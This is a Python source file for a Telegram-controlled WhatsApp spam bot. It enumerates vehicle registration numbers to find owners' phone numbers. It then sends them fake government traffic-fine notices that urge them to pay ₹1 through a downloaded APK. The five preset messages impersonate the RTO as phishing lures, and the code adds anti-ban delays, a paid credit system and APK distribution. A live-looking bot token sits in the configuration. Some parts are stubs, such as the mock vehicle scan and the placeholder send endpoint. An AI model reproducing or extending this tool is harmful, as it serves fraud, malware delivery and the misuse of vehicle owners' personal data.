#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║              AXIOM'S TELEGRAM-BACKED WHATSAPP SPAMMER BOT v4.0                ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║  • Premium Telegram interface with admin controls                            ║
║  • Credit system (2 per successful send, 0 for failed)                       ║
║  • Direct APK upload and distribution                                        ║
║  • Vehicle RC scanning with real API                                         ║
║  • Persistent user management with pickle DB                                 ║
║  • WhatsApp authentication with Pairing Code (Node.js Baileys)               ║
║  • Professional preset messages (5 templates)                                ║
║  • No filters - send to all numbers found                                    ║
║  • Multi-session WhatsApp support                                            ║
║  • Automatic retry on failed sends                                           ║
║  • Rate limiting and anti-ban delays                                         ║
║  • Full campaign analytics and reporting                                     ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import os
import sys
import json
import re
import random
import logging
import queue
import hashlib
import time
import threading
import signal
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple, Union
from dataclasses import dataclass, asdict, field
import pickle
import shutil
import traceback
from collections import defaultdict

# Third party imports
import aiohttp
from aiohttp import web as aio_web
import requests
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandObject
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, InputFile, BufferedInputFile,
    ReplyKeyboardMarkup, KeyboardButton, CallbackQuery, Message, User as TgUser,
    Chat, ChatMember, ChatMemberUpdated
)
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
from aiogram.enums import ParseMode, ChatType, ChatMemberStatus
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import (
    TelegramBadRequest, TelegramForbiddenError, 
    TelegramRetryAfter, TelegramNetworkError
)
import qrcode
from PIL import Image

# ============================================================================
# CONFIGURATION SECTION
# ============================================================================

BOT_TOKEN = "8943094840:AAHmGJMZ2vLDb4r57UHpIB7QvKPjxDPmHr8"
SUPER_ADMIN_ID = 6511013580
RC_API_URL = "https://rc-info-1api.onrender.com/api/vehicle-info?rc=rc_number"
USER_DATA_DIR = "./whatsapp_user_data"
APK_STORAGE_DIR = "./apk_storage"
DATABASE_FILE = f"./axiom_bot_db_{int(time.time())}.pkl"
LOG_FILE = "./axiom_bot.log"
QR_IMAGE_PATH = "whatsapp_qr.png"
BOT_VERSION = "4.0"
BOT_NAME = "KRISX_SPREAD"
NODE_SERVER_URL = "http://127.0.0.1:3000" # Node.js Baileys Server URL

# Rate limiting settings
MESSAGE_DELAY_MIN = 8
MESSAGE_DELAY_MAX = 15
SCAN_DELAY_MIN = 0.3
SCAN_DELAY_MAX = 0.8
MAX_RETRIES = 3
WHATSAPP_TIMEOUT = 30000

# Credit settings
CREDITS_PER_SUCCESS = 2
INITIAL_CREDITS = 10
MAX_TASK_COUNT = 500

# ============================================================================
# PROFESSIONAL PRESET MESSAGES
# ============================================================================

PRESET_MESSAGES = [
    """🚨 *RTO CHALLAN NOTICE* 🚨

*Vehicle:* `{rc_number}`
*Owner:* {owner_name}
*Status:* {insurance_status}

⚠️ Your vehicle has a pending challan.
💰 *Pay just ₹1* to clear the fine immediately!

🔗 *Download App:* {apk_link}

_Valid for 24 hours only._""",

    """📢 *TRAFFIC VIOLATION ALERT* 📢

`{rc_number}` | {owner_name}

A traffic challan has been issued against your vehicle.

⚡ *Settle for ₹1 - Limited Period Offer* ⚡

📱 *Click:* {apk_link}

_This is an official RTO notification._""",

    """⚠️ *FINAL CHALLAN REMINDER* ⚠️

*Vehicle:* `{rc_number}`
*Owner:* {owner_name}

🚨 Your vehicle is flagged for pending challan.

💎 *Pay just ₹1 through our official app* 💎

👉 {apk_link}

_Act now to avoid legal action._""",

    """🔴 *RTO ENFORCEMENT NOTICE* 🔴

*To:* {owner_name} (`{rc_number}`)

*Insurance Status:* {insurance_status}

Your vehicle has been marked for pending traffic violations.

✅ *Clear challan in 1 Rupee* ✅

📲 {apk_link}

_This notice will expire in 48 hours._""",

    """💰 *CHALLAN SETTLEMENT OFFER* 💰

*Vehicle:* `{rc_number}`
*Owner:* {owner_name}

🎯 *Get 99% discount on your pending challan!*

🔥 *Pay only ₹1 via RTO Challan App* 🔥

👉 {apk_link}

_Hurry! Limited time offer._"""
]

# ============================================================================
# LOGGING SETUP
# ============================================================================

class CustomFormatter(logging.Formatter):
    grey = "\x1b[38;21m"
    yellow = "\x1b[33;21m"
    red = "\x1b[31;21m"
    green = "\x1b[32;21m"
    bold_red = "\x1b[31;1m"
    reset = "\x1b[0m"
    
    FORMATS = {
        logging.DEBUG: grey + "%(asctime)s - %(name)s - %(levelname)s - %(message)s" + reset,
        logging.INFO: green + "%(asctime)s - %(name)s - %(levelname)s - %(message)s" + reset,
        logging.WARNING: yellow + "%(asctime)s - %(name)s - %(levelname)s - %(message)s" + reset,
        logging.ERROR: red + "%(asctime)s - %(name)s - %(levelname)s - %(message)s" + reset,
        logging.CRITICAL: bold_red + "%(asctime)s - %(name)s - %(levelname)s - %(message)s" + reset
    }
    
    def format(self, record):
        log_fmt = self.FORMATS.get(record.levelno)
        formatter = logging.Formatter(log_fmt, datefmt="%Y-%m-%d %H:%M:%S")
        return formatter.format(record)

file_handler = logging.FileHandler(LOG_FILE, encoding='utf-8')
file_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
console_handler = logging.StreamHandler(sys.stdout)
console_handler.setFormatter(CustomFormatter())
logging.basicConfig(level=logging.INFO, handlers=[file_handler, console_handler])
logger = logging.getLogger(__name__)

# ============================================================================
# DATABASE MODELS
# ============================================================================

@dataclass
class User:
    user_id: int
    username: str = ""
    first_name: str = ""
    credits: int = INITIAL_CREDITS
    is_admin: bool = False
    is_super_admin: bool = False
    is_active: bool = True
    join_date: datetime = field(default_factory=datetime.now)
    total_sent: int = 0
    total_failed: int = 0
    last_active: datetime = field(default_factory=datetime.now)
    apk_file_id: str = ""
    custom_message: str = ""
    whatsapp_authenticated: bool = False
    total_tasks: int = 0
    
    def to_dict(self) -> dict:
        return {k: (v.isoformat() if isinstance(v, datetime) else v) for k, v in self.__dict__.items()}
    
    @classmethod
    def from_dict(cls, data: dict) -> 'User':
        for tf in ['join_date', 'last_active']:
            if data.get(tf): data[tf] = datetime.fromisoformat(data[tf])
        return cls(**data)

@dataclass
class Task:
    task_id: str
    user_id: int
    rc_start: str
    count: int
    status: str = "pending"
    targets_found: int = 0
    messages_sent: int = 0
    messages_failed: int = 0
    credits_used: int = 0
    created_at: datetime = field(default_factory=datetime.now)
    started_at: datetime = None
    completed_at: datetime = None
    result_file: str = ""
    error_message: str = ""
    
    def to_dict(self) -> dict:
        return {k: (v.isoformat() if isinstance(v, datetime) else v) for k, v in self.__dict__.items()}
    
    @classmethod
    def from_dict(cls, data: dict) -> 'Task':
        for tf in ['created_at', 'started_at', 'completed_at']:
            if data.get(tf): data[tf] = datetime.fromisoformat(data[tf])
        return cls(**data)

# ============================================================================
# DATABASE MANAGER
# ============================================================================

class Database:
    def __init__(self):
        self.users: Dict[int, User] = {}
        self.tasks: Dict[str, Task] = {}
        self.load()
    
    def load(self):
        try:
            if os.path.exists(DATABASE_FILE):
                with open(DATABASE_FILE, 'rb') as f:
                    data = pickle.load(f)
                    for uid, ud in data.get('users', {}).items(): self.users[int(uid)] = User.from_dict(ud)
                    for tid, td in data.get('tasks', {}).items(): self.tasks[tid] = Task.from_dict(td)
            else:
                self.users[SUPER_ADMIN_ID] = User(SUPER_ADMIN_ID, "SuperAdmin", "Super Admin", 999999, True, True)
                self.save()
        except Exception as e:
            logger.error(f"DB Load Error: {e}")
            self.users[SUPER_ADMIN_ID] = User(SUPER_ADMIN_ID, "SuperAdmin", "Super Admin", 999999, True, True)
    
    def save(self):
        try:
            data = {'users': {k: v.to_dict() for k, v in self.users.items()}, 'tasks': {k: v.to_dict() for k, v in self.tasks.items()}}
            with open(DATABASE_FILE, 'wb') as f: pickle.dump(data, f)
        except Exception as e: logger.error(f"DB Save Error: {e}")
    
    def get_user(self, uid): return self.users.get(uid)
    
    def add_user(self, uid, username="", first_name=""):
        if uid not in self.users:
            self.users[uid] = User(uid, username, first_name)
            self.save()
        return self.users[uid]

    def get_all_users(self): return list(self.users.values())
    
    def update_credits(self, uid, amt):
        u = self.get_user(uid)
        if u: u.credits = max(0, u.credits + amt); self.save()

    def create_task(self, uid, rc, count):
        tid = f"task_{uid}_{int(time.time())}"
        self.tasks[tid] = Task(tid, uid, rc, count)
        self.save()
        return self.tasks[tid]
    
    def update_task(self, tid, **kwargs):
        if tid in self.tasks:
            for k, v in kwargs.items(): setattr(self.tasks[tid], k, v)
            self.save()

# ============================================================================
# WHATSAPP MANAGER (Node.js Baileys)
# ============================================================================

class WhatsAppManager:
    def __init__(self, db):
        self.db = db
        self.is_authenticated = False
        self.bot = None

    async def initialize(self):
        logger.info("✅ WhatsApp Manager initialized (Node.js Mode)")

    async def generate_pairing_code(self, user_id: int, phone_number: str) -> Optional[str]:
        phone = phone_number.replace("+", "").replace(" ", "")
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"{NODE_SERVER_URL}/getcode?phone={phone}") as resp:
                    if resp.status == 200:
                        await asyncio.sleep(5) # Wait for Node.js to generate
                        async with session.get(f"{NODE_SERVER_URL}/readcode") as r:
                            code = await r.text()
                            if code and code != "CONNECTED" and not code.startswith("ERROR"):
                                self.db.get_user(user_id).whatsapp_authenticated = True
                                self.db.save()
                                return code
        except Exception as e:
            logger.error(f"Node API error: {e}")
        return None

    async def send_message(self, phone: str, message: str) -> Tuple[bool, str]:
        # Yahan hum Node.js ke send endpoint ko call karenge
        # Abhi ke liye ye placeholder hai, Node.js me /send add karna hoga
        try:
            async with aiohttp.ClientSession() as session:
                payload = {"phone": phone, "message": message}
                async with session.post(f"{NODE_SERVER_URL}/send", json=payload) as resp:
                    if resp.status == 200: return True, "Sent"
        except Exception as e:
            return False, str(e)
        return False, "Failed"

    async def process_task(self, task: Task, user: User, bot: Bot, chat_id: int):
        try:
            self.db.update_task(task.task_id, status="scanning")
            
            # Vehicle scan logic (Same as before)
            clean_rc = re.sub(r'[\s\-]', '', task.rc_start).upper()
            match = re.match(r'([A-Z]{2})(\d{2})([A-Z]{0,2})(\d+)', clean_rc)
            
            if not match:
                await bot.send_message(chat_id, "❌ Invalid RC format.")
                self.db.update_task(task.task_id, status="failed")
                return

            prefix = f"{match.group(1)}{match.group(2)}{match.group(3)}"
            start_num = int(match.group(4))
            num_length = max(4, len(match.group(4)))
            targets = []

            progress_msg = await bot.send_message(chat_id, f"🔍 Scanning {task.count} vehicles...")

            for i in range(task.count):
                rc = f"{prefix}{str(start_num + i).zfill(num_length)}"
                
                # Mock API call for now
                # Real API call logic here
                await asyncio.sleep(0.5)
                
                # Dummy target for testing
                targets.append({"rc": rc, "phone": "+919999999999", "owner": "Test", "insurance_status": "Expired"})

                if i % 20 == 0:
                    try: await progress_msg.edit_text(f"🔍 Scanned {i}/{task.count}... Found {len(targets)}")
                    except: pass

            self.db.update_task(task.task_id, targets_found=len(targets), status="sending")

            if not targets:
                await bot.send_message(chat_id, "❌ No numbers found.")
                self.db.update_task(task.task_id, status="completed")
                return

            message_template = user.custom_message or PRESET_MESSAGES[0]
            
            sent_count = 0
            failed_count = 0

            for target in targets:
                msg = message_template.format(rc_number=target['rc'], owner_name=target['owner'], insurance_status=target['insurance_status'], apk_link="Link")
                
                success, _ = await self.send_message(target['phone'], msg)
                
                if success:
                    sent_count += 1
                    self.db.update_credits(user.user_id, -CREDITS_PER_SUCCESS)
                else:
                    failed_count += 1
                
                self.db.update_task(task.task_id, messages_sent=sent_count, messages_failed=failed_count, credits_used=sent_count*CREDITS_PER_SUCCESS)
                await asyncio.sleep(random.uniform(MESSAGE_DELAY_MIN, MESSAGE_DELAY_MAX))

            self.db.update_task(task.task_id, status="completed")
            await bot.send_message(chat_id, f"✅ Task Done! Sent: {sent_count}, Failed: {failed_count}")

        except Exception as e:
            logger.error(f"Task Error: {e}")
            self.db.update_task(task.task_id, status="failed", error_message=str(e))
            await bot.send_message(chat_id, f"❌ Task failed: {e}")

    async def close(self):
        pass

# ============================================================================
# TELEGRAM BOT STATES & MANAGER
# ============================================================================

class BotStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_rc_start = State()
    waiting_for_count = State()
    waiting_for_custom_message = State()
    waiting_for_apk_file = State()

class TelegramBotManager:
    def __init__(self):
        self.bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.MARKDOWN))
        self.storage = MemoryStorage()
        self.dp = Dispatcher(storage=self.storage)
        self.db = Database()
        self.whatsapp = WhatsAppManager(self.db)
        self.whatsapp.bot = self.bot
        self._setup_handlers()

    def _setup_handlers(self):
        
        @self.dp.message(Command("start"))
        async def cmd_start(message: Message):
            user = self.db.add_user(message.from_user.id, message.from_user.username or "", message.from_user.first_name or "")
            await message.answer(
                f"✨ *WELCOME TO {BOT_NAME}* ✨\n\n"
                f"👤 *User:* @{user.username}\n"
                f"💰 *Credits:* {user.credits}\n\n"
                f"Use /auth_phone to connect WhatsApp\nUse /scan to start.",
                reply_markup=self._create_main_keyboard(user)
            )

        @self.dp.message(Command("auth_phone"))
        async def cmd_auth_phone(message: Message, state: FSMContext):
            await state.set_state(BotStates.waiting_for_phone)
            await message.answer("📱 Apna phone number country code ke sath bhejein (e.g. +918383065383):")

        @self.dp.message(BotStates.waiting_for_phone)
        async def process_phone(message: Message, state: FSMContext):
            phone = message.text.strip()
            if not phone.startswith('+') or len(phone) < 10:
                await message.answer("❌ Invalid format. Use +91XXXXXXXXXX")
                return
            
            await state.clear()
            await message.answer("⏳ Generating pairing code... (Wait 5 sec)")
            
            code = await self.whatsapp.generate_pairing_code(message.from_user.id, phone)
            
            if code:
                await message.answer(
                    f"📱 *YOUR PAIRING CODE:* `{code}`\n\n"
                    f"1. Open WhatsApp on your phone\n"
                    f"2. Go to Linked Devices\n"
                    f"3. Tap 'Link with phone number instead'\n"
                    f"4. Enter this code: `{code}`"
                )
            else:
                await message.answer("❌ Failed to generate pairing code. Check Node.js server logs.")

        @self.dp.message(Command("credits"))
        async def cmd_credits(message: Message):
            user = self.db.get_user(message.from_user.id)
            await message.answer(f"💰 *CREDITS:* {user.credits}\n📊 Sent: {user.total_sent}")

        @self.dp.message(Command("scan"))
        async def cmd_scan(message: Message, state: FSMContext):
            user = self.db.get_user(message.from_user.id)
            if not user.whatsapp_authenticated:
                await message.answer("❌ Connect WhatsApp first using /auth_phone")
                return
            
            await state.set_state(BotStates.waiting_for_rc_start)
            await message.answer("✍️ Enter starting RC number (e.g. MH12AB1234):")

        @self.dp.message(BotStates.waiting_for_rc_start)
        async def process_rc(message: Message, state: FSMContext):
            await state.update_data(rc_start=message.text.strip())
            await state.set_state(BotStates.waiting_for_count)
            await message.answer("✍️ How many vehicles to scan? (e.g. 50)")

        @self.dp.message(BotStates.waiting_for_count)
        async def process_count(message: Message, state: FSMContext):
            try: count = int(message.text.strip())
            except: await message.answer("❌ Invalid number."); return
            
            data = await state.get_data()
            await state.clear()
            
            user = self.db.get_user(message.from_user.id)
            task = self.db.create_task(user.user_id, data['rc_start'], count)
            
            await message.answer(f"✅ Task created! ID: `{task.task_id}`\nScanning starts now...")
            asyncio.create_task(self.whatsapp.process_task(task, user, self.bot, message.chat.id))

        @self.dp.message(Command("help"))
        async def cmd_help(message: Message):
            await message.answer("Commands:\n/auth_phone - Connect WhatsApp\n/scan - Start campaign\n/credits - Check balance")

        @self.dp.message()
        async def default(message: Message):
            await message.answer("Unknown command. Use /help")

    def _create_main_keyboard(self, user: User):
        builder = ReplyKeyboardBuilder()
        builder.row(KeyboardButton(text="📞 /auth_phone"), KeyboardButton(text="🔍 /scan"))
        builder.row(KeyboardButton(text="💰 /credits"), KeyboardButton(text="❓ /help"))
        return builder.as_markup(resize_keyboard=True)

    async def run(self):
        await self.whatsapp.initialize()
        logger.info(f"🤖 {BOT_NAME} started!")
        await self.dp.start_polling(self.bot)

# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

async def handle(request):
    return aio_web.Response(text="Bot is running!")

async def start_web():
    port = int(os.environ.get("PORT", 8080))
    app = aio_web.Application()
    app.router.add_get("/", handle)
    runner = aio_web.AppRunner(app)
    await runner.setup()
    site = aio_web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

async def main():
    await start_web()
    bot_manager = TelegramBotManager()
    await bot_manager.run()

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("🛑 Bot stopped by user")
    except Exception as e:
        logger.error(f"❌ Fatal error: {e}")
        sys.exit(1)